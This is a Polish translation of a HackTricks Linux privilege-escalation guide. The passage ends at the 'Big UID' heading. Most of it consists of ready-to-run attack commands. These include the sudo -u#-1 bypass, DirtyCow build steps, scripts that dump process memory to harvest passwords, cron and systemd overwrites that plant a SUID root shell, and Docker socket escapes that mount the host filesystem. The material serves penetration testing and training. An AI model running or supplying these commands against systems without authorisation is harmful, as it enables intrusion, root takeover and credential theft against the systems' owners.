# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacje o systemie

### Informacje o systemie operacyjnym

Zacznijmy zdobywać trochę informacji o uruchomionym systemie operacyjnym
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### PATH

Jeśli **masz uprawnienia zapisu w dowolnym folderze znajdującym się w zmiennej `PATH`** możesz przejąć niektóre biblioteki lub pliki binarne:
```bash
echo $PATH
```
### Informacje o środowisku

Czy w zmiennych środowiskowych znajdują się interesujące informacje, hasła lub klucze API?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Sprawdź wersję kernela i czy istnieje jakiś exploit, który można użyć do escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Możesz znaleźć dobrą listę podatnych jąder i kilka już **compiled exploits** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Inne strony, gdzie możesz znaleźć kilka **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie podatne wersje jądra z tej strony możesz zrobić:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Narzędzia, które mogą pomóc w wyszukiwaniu kernel exploits to:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Zawsze **wyszukaj wersję kernela w Google** — być może Twoja wersja kernela jest wymieniona w jakimś kernel exploit i wtedy będziesz mieć pewność, że exploit jest skuteczny.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Wersja Sudo

Na podstawie podatnych wersji Sudo, które pojawiają się w:
```bash
searchsploit sudo
```
Możesz sprawdzić, czy wersja sudo jest podatna, używając tego polecenia grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Sprawdź **smasher2 box of HTB** dla **przykładu**, jak tę vuln można wykorzystać
```bash
dmesg 2>/dev/null | grep "signature"
```
### Więcej enumeracji systemu
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Wymień możliwe zabezpieczenia

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Jeśli znajdujesz się wewnątrz kontenera docker możesz spróbować z niego uciec:


{{#ref}}
docker-security/
{{#endref}}

## Dyski

Sprawdź **co jest zamontowane i odmontowane**, gdzie i dlaczego. Jeśli coś jest odmontowane, możesz spróbować to zamontować i sprawdzić, czy nie zawiera poufnych informacji.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Przydatne oprogramowanie

Wymień przydatne binaria
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Sprawdź również, czy **jakiś kompilator jest zainstalowany**. Przyda się to, jeśli będziesz musiał użyć jakiegoś kernel exploit, ponieważ zaleca się skompilować go na maszynie, na której zamierzasz go użyć (lub na podobnej).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zainstalowane podatne oprogramowanie

Sprawdź **wersję zainstalowanych pakietów i usług**. Może istnieć jakaś stara wersja Nagios (na przykład), która mogłaby zostać wykorzystana do escalating privileges…\
Zaleca się ręczne sprawdzenie wersji bardziej podejrzanego zainstalowanego oprogramowania.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Jeśli masz dostęp SSH do maszyny, możesz także użyć **openVAS** aby sprawdzić przestarzałe i podatne oprogramowanie zainstalowane na maszynie.

> [!NOTE] > _Zauważ, że te polecenia pokażą dużo informacji, które w większości będą bezużyteczne, dlatego zalecane jest użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy jakakolwiek z zainstalowanych wersji oprogramowania jest podatna na known exploits_

## Procesy

Spójrz, **jakie procesy** są uruchamiane i sprawdź, czy któryś proces nie ma **więcej uprawnień niż powinien** (może tomcat uruchamiany przez root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Monitorowanie procesów

Możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy) do monitorowania procesów. To może być bardzo przydatne do zidentyfikowania podatnych procesów uruchamianych często lub gdy spełnione są określone warunki.

### Pamięć procesu

Niektóre usługi serwera zapisują **credentials in clear text inside the memory**.\
Zazwyczaj będziesz potrzebować **root privileges**, aby czytać pamięć procesów należących do innych użytkowników, dlatego jest to zwykle bardziej przydatne, gdy już masz root i chcesz odkryć więcej credentials.\
Pamiętaj jednak, że **jako zwykły użytkownik możesz czytać pamięć procesów, które posiadasz**.

> [!WARNING]
> Zauważ, że obecnie większość maszyn **nie pozwala na ptrace domyślnie**, co oznacza, że nie możesz zrzucać innych procesów należących do twojego nieuprzywilejowanego użytkownika.
>
> Plik _**/proc/sys/kernel/yama/ptrace_scope**_ kontroluje dostępność ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: wszystkie procesy mogą być debugowane, pod warunkiem że mają ten sam uid. To klasyczny sposób działania ptrace.
> - **kernel.yama.ptrace_scope = 1**: tylko proces nadrzędny może być debugowany.
> - **kernel.yama.ptrace_scope = 2**: tylko admin może używać ptrace, ponieważ wymagana jest capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: żadne procesy nie mogą być śledzone przy użyciu ptrace. Po ustawieniu wymagany jest reboot, aby ponownie włączyć ptrace.

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz pobrać Heap i przeszukać go w poszukiwaniu credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skrypt GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Dla danego PID, **maps pokazują, jak pamięć jest mapowana w wirtualnej przestrzeni adresowej tego procesu**; pokazują też **uprawnienia każdej zmapowanej strefy**. Pseudo-plik **mem** **udostępnia samą pamięć procesu**. Z pliku **maps** wiemy, które **obszary pamięci są do odczytu** oraz ich przesunięcia. Wykorzystujemy te informacje, aby **przesunąć wskaźnik w pliku mem i zrzucić wszystkie regiony dostępne do odczytu** do pliku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` zapewnia dostęp do systemowej **pamięci fizycznej**, a nie pamięci wirtualnej. Wirtualna przestrzeń adresowa jądra może być dostępna za pomocą /dev/kmem.\
Zazwyczaj `/dev/mem` jest czytelny tylko dla **root** i grupy **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump dla linux

ProcDump to adaptacja klasycznego narzędzia ProcDump z pakietu Sysinternals dla Windows. Pobierz je z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Narzędzia

Aby zrzucić pamięć procesu możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania root i zrzucić proces należący do ciebie
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagany jest root)

### Dane uwierzytelniające z pamięci procesu

#### Przykład ręczny

Jeśli stwierdzisz, że proces authenticator jest uruchomiony:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Możesz dump the process (zobacz wcześniejsze sekcje, aby znaleźć różne sposoby na dump the memory of a process) i przeszukać credentials w memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) będzie **wykradać poświadczenia w postaci jawnego tekstu z pamięci** oraz z niektórych **znanych plików**. Wymaga uprawnień roota, aby działać prawidłowo.

| Funkcja                                           | Nazwa procesu        |
| ------------------------------------------------- | -------------------- |
| Hasło GDM (Kali Desktop, Debian Desktop)         | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktywne połączenia FTP)                   | vsftpd               |
| Apache2 (aktywne sesje HTTP Basic Auth)           | apache2              |
| OpenSSH (aktywne sesje SSH - użycie sudo)         | sshd:                |

#### Wzorce wyszukiwania/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zaplanowane/Cron jobs

Sprawdź, czy któreś ze zaplanowanych zadań jest podatne. Być może możesz wykorzystać skrypt uruchamiany przez root (wildcard vuln? można modyfikować pliki, których używa root? użyć symlinks? stworzyć specyficzne pliki w katalogu, którego używa root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Ścieżka Cron

Na przykład, w pliku _/etc/crontab_ możesz znaleźć PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zwróć uwagę, że użytkownik "user" ma uprawnienia zapisu w /home/user_)

Jeśli w tym crontabie użytkownik root próbuje wykonać jakąś komendę lub skrypt bez ustawienia PATH. Na przykład: _\* \* \* \* root overwrite.sh_\

Wtedy możesz uzyskać powłokę roota, używając:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron używający skryptu z wildcard (Wildcard Injection)

Jeśli skrypt uruchamiany przez root ma “**\***” w poleceniu, możesz to wykorzystać do wywołania nieoczekiwanych efektów (np. privesc). Przykład:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Jeśli wildcard jest poprzedzony ścieżką taką jak** _**/some/path/\***_ **, nie jest podatny (nawet** _**./\***_ **nie jest).**

Przeczytaj następującą stronę, aby poznać więcej trików dotyczących wildcard exploitation:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Nadpisywanie skryptu Cron i symlink

Jeśli **możesz zmodyfikować cron script** uruchamiany przez root, możesz bardzo łatwo uzyskać shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Jeśli script uruchamiany przez root korzysta z **katalogu, do którego masz pełny dostęp**, może być przydatne usunięcie tego katalogu i **utworzenie symlinku wskazującego na inny**, który będzie serwował script kontrolowany przez ciebie.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Częste cron jobs

Możesz monitorować procesy, aby wyszukać te, które są uruchamiane co 1, 2 lub 5 minut. Być może możesz to wykorzystać i eskalować uprawnienia.

Na przykład, aby **monitorować co 0.1s przez 1 minutę**, **posortować według najmniej wykonywanych poleceń** i usunąć polecenia, które były wykonywane najczęściej, możesz zrobić:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Możesz też użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (to będzie monitorować i wyświetlać wszystkie procesy, które zostaną uruchomione).

### Niewidoczne cron jobs

Możliwe jest utworzenie cronjoba **wstawiając znak carriage return po komentarzu** (bez znaku nowej linii), i cron job będzie działać. Przykład (zwróć uwagę na znak carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Usługi

### Zapisywalne pliki _.service_

Sprawdź, czy możesz zapisać dowolny plik `.service`, jeśli tak, możesz go **zmodyfikować**, aby **uruchamiał** twój **backdoor**, gdy usługa jest **uruchamiana**, **restartowana** lub **zatrzymywana** (może być konieczne oczekiwanie na reboot maszyny).\
Na przykład umieść swój backdoor w pliku .service używając **`ExecStart=/tmp/script.sh`**

### Zapisywalne pliki binarne usług

Pamiętaj, że jeśli masz **uprawnienia zapisu do binariów uruchamianych przez usługi**, możesz je zmienić, aby umieścić backdoor, tak że po ponownym uruchomieniu usług backdoor zostanie wykonany.

### systemd PATH - Ścieżki względne

Możesz zobaczyć PATH używany przez **systemd** za pomocą:
```bash
systemctl show-environment
```
Jeśli stwierdzisz, że możesz **zapisywać** w którymkolwiek z folderów na tej ścieżce, możesz być w stanie **eskalować uprawnienia**. Musisz szukać **ścieżek względnych używanych w plikach konfiguracyjnych usług** takich jak:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Następnie utwórz **wykonywalny plik** o **takiej samej nazwie jak binarka w ścieżce względnej** wewnątrz folderu systemd PATH, do którego masz zapis, a gdy usługa zostanie poproszona o wykonanie podatnej akcji (**Start**, **Stop**, **Reload**), twój **backdoor zostanie uruchomiony** (użytkownicy nieuprzywilejowani zwykle nie mogą uruchamiać/zatrzymywać usług, ale sprawdź, czy możesz użyć `sudo -l`).

**Dowiedz się więcej o usługach za pomocą `man systemd.service`.**

## **Timery**

Timery to pliki unit systemd, których nazwa kończy się na `**.timer**`, które kontrolują pliki lub zdarzenia `**.service**`. Timery mogą być używane jako alternatywa dla cron, ponieważ mają wbudowane wsparcie dla zdarzeń czasowych kalendarza i zdarzeń monotonicznych oraz mogą być uruchamiane asynchronicznie.

Możesz wylistować wszystkie timery za pomocą:
```bash
systemctl list-timers --all
```
### Zapisywalne timery

Jeśli możesz zmodyfikować timer, możesz sprawić, że uruchomi on niektóre istniejące jednostki systemd.unit (takie jak `.service` lub `.target`)
```bash
Unit=backdoor.service
```
W dokumentacji możesz przeczytać, czym jest Unit:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Dlatego, aby nadużyć tego uprawnienia musiałbyś:

- Znaleźć jakąś jednostkę systemd (np. `.service`), która **uruchamia binarkę, do której masz prawa zapisu**
- Znaleźć jednostkę systemd, która **uruchamia względną ścieżkę** i masz **uprawnienia zapisu** do **systemd PATH** (aby podszyć się pod ten plik wykonywalny)

**Dowiedz się więcej o timerach za pomocą `man systemd.timer`.**

### **Włączanie timera**

Aby włączyć timer, potrzebujesz uprawnień roota i musisz wykonać:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Zwróć uwagę, że **timer** jest **aktywowany** przez utworzenie dowiązania symbolicznego do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Gniazda

Unix Domain Sockets (UDS) umożliwiają **komunikację procesów** na tych samych lub różnych maszynach w modelach klient-serwer. Wykorzystują standardowe pliki deskryptorów Unix do komunikacji między komputerami i są konfigurowane za pomocą plików `.socket`.

Sockets can be configured using `.socket` files.

**Dowiedz się więcej o sockets za pomocą `man systemd.socket`.** Wewnątrz tego pliku można skonfigurować kilka interesujących parametrów:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Te opcje różnią się, ale w skrócie służą do **wskazania, gdzie będzie nasłuchiwany** socket (ścieżka pliku gniazda AF_UNIX, numer IPv4/6 i/lub port do nasłuchu itp.)
- `Accept`: Przyjmuje argument typu boolean. Jeśli **true**, dla każdego przychodzącego połączenia tworzona jest **instancja serwisu** i tylko gniazdo połączenia jest do niej przekazywane. Jeśli **false**, wszystkie nasłuchujące gniazda są **przekazywane do uruchomionej jednostki serwisu**, i tworzona jest tylko jedna jednostka serwisu dla wszystkich połączeń. Ta wartość jest ignorowana dla datagramów i FIFO, gdzie jedna jednostka serwisu bezwarunkowo obsługuje cały przychodzący ruch. **Domyślnie false**. Ze względów wydajnościowych zaleca się pisanie nowych daemonów w sposób zgodny z `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Przyjmują jedną lub więcej linii poleceń, które są **wykonywane przed** lub **po** utworzeniu i powiązaniu nasłuchujących **gniazd**/FIFO, odpowiednio. Pierwszy token linii poleceń musi być ścieżką bezwzględną do pliku wykonywalnego, po którym następują argumenty procesu.
- `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane przed** lub **po** zamknięciu i usunięciu nasłuchujących **gniazd**/FIFO, odpowiednio.
- `Service`: Określa nazwę jednostki **service**, którą należy **aktywować** przy **przychodzącym ruchu**. To ustawienie jest dozwolone tylko dla gniazd z Accept=no. Domyślnie wskazuje serwis o tej samej nazwie co socket (z zastąpionym sufiksem). W większości przypadków nie jest konieczne używanie tej opcji.

### Zapisywalne pliki .socket

Jeśli znajdziesz **zapisywalny** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś w stylu: `ExecStartPre=/home/kali/sys/backdoor` i backdoor zostanie uruchomiony przed utworzeniem socketu. W związku z tym **prawdopodobnie będziesz musiał poczekać na ponowne uruchomienie maszyny.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Zapisywalne gniazda

Jeśli **zidentyfikujesz jakiekolwiek zapisywalne gniazdo** (_tu mówimy o Unix Sockets, a nie o plikach konfiguracyjnych `.socket`_), to **możesz komunikować się** z tym gniazdem i ewentualnie wykorzystać podatność.

### Enumeracja Unix Sockets
```bash
netstat -a -p --unix
```
### Surowe połączenie
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Przykład eksploatacji:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Zwróć uwagę, że mogą istnieć **sockets nasłuchujące żądań HTTP** (_Nie mam na myśli .socket files, lecz pliki działające jako unix sockets_). Możesz to sprawdzić za pomocą:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Jeśli socket **odpowiada na żądanie HTTP**, to możesz **komunikować się** z nim i być może **wykorzystać jakąś podatność**.

### Zapisywalny Docker Socket

Docker socket, często znajdujący się w `/var/run/docker.sock`, to krytyczny plik, który powinien być zabezpieczony. Domyślnie jest on zapisywalny przez użytkownika `root` i członków grupy `docker`. Posiadanie dostępu do zapisu do tego socketu może prowadzić do eskalacji uprawnień. Poniżej znajduje się przegląd, jak można to zrobić oraz alternatywne metody, jeśli Docker CLI nie jest dostępne.

#### **Eskalacja uprawnień z użyciem Docker CLI**

Jeśli masz dostęp zapisowy do Docker socket, możesz eskalować uprawnienia używając następujących poleceń:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Te polecenia pozwalają uruchomić kontener z uprawnieniami roota do systemu plików hosta.

#### **Using Docker API Directly**

W przypadkach, gdy Docker CLI nie jest dostępne, Docker socket można nadal obsługiwać przy użyciu Docker API i poleceń `curl`.

1.  **List Docker Images:** Pobierz listę dostępnych obrazów.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Wyślij żądanie utworzenia kontenera, który montuje katalog root systemu hosta.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Uruchom nowo utworzony kontener:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Użyj `socat`, aby nawiązać połączenie z kontenerem, co umożliwi wykonywanie poleceń wewnątrz niego.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Po ustanowieniu połączenia za pomocą `socat` możesz wykonywać polecenia bezpośrednio w kontenerze z uprawnieniami roota do systemu plików hosta.

### Others

Zauważ, że jeśli masz uprawnienia do zapisu do docker socket, ponieważ jesteś **inside the group `docker`** masz [**więcej sposobów na eskalację uprawnień**](interesting-groups-linux-pe/index.html#docker-group). Jeśli [**docker API nasłuchuje na porcie** możesz też być w stanie je przejąć](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **więcej sposobów na ucieczkę z docker lub nadużycie go w celu eskalacji uprawnień** w:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Jeśli odkryjesz, że możesz użyć polecenia **`ctr`**, przeczytaj następującą stronę, ponieważ **możesz być w stanie nadużyć go do eskalacji uprawnień**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Jeśli odkryjesz, że możesz użyć polecenia **`runc`**, przeczytaj następującą stronę, ponieważ **możesz być w stanie nadużyć go do eskalacji uprawnień**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus to zaawansowany system **inter-Process Communication (IPC)**, który umożliwia aplikacjom efektywną współpracę i wymianę danych. Zaprojektowany z myślą o nowoczesnym systemie Linux, oferuje solidne ramy dla różnych form komunikacji między aplikacjami.

System jest wszechstronny, wspierając podstawowe IPC, które usprawnia wymianę danych między procesami, przypominając **rozszerzone UNIX domain sockets**. Ponadto pomaga w rozgłaszaniu zdarzeń lub sygnałów, ułatwiając integrację komponentów systemowych. Na przykład sygnał od demona Bluetooth o przychodzącym połączeniu może spowodować, że odtwarzacz muzyki wyciszy dźwięk, poprawiając doświadczenie użytkownika. Dodatkowo D-Bus wspiera zdalny system obiektów, upraszczając żądania usług i wywołania metod między aplikacjami, upraszczając procesy, które tradycyjnie były skomplikowane.

D-Bus działa na modelu **allow/deny**, zarządzając uprawnieniami wiadomości (wywołania metod, emisje sygnałów itp.) na podstawie skumulowanego działania dopasowujących się reguł polityki. Te polityki określają interakcje z busem, co potencjalnie może prowadzić do eskalacji uprawnień poprzez wykorzystanie tych uprawnień.

Przykład takiej polityki w /etc/dbus-1/system.d/wpa_supplicant.conf pokazuje uprawnienia dla użytkownika root do posiadania, wysyłania i odbierania wiadomości od fi.w1.wpa_supplicant1.

Polityki bez określonego użytkownika lub grupy stosują się uniwersalnie, natomiast polityki w kontekście "default" dotyczą wszystkich, którzy nie są objęci przez inne bardziej specyficzne polityki.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Dowiedz się, jak enumerować i wykorzystać komunikację D-Bus tutaj:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Sieć**

Warto przeprowadzić enumerację sieci i ustalić pozycję maszyny.

### Ogólna enumeracja
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otwarte porty

Zawsze sprawdzaj usługi sieciowe działające na maszynie, z którymi nie mogłeś wchodzić w interakcję przed uzyskaniem do niej dostępu:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Sprawdź, czy możesz sniff traffic. Jeśli tak, możesz przechwycić jakieś poświadczenia.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

Sprawdź, kim jesteś, jakie masz **privileges**, jacy **users** są w systemie, którzy mogą wykonać **login** i którzy mają **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

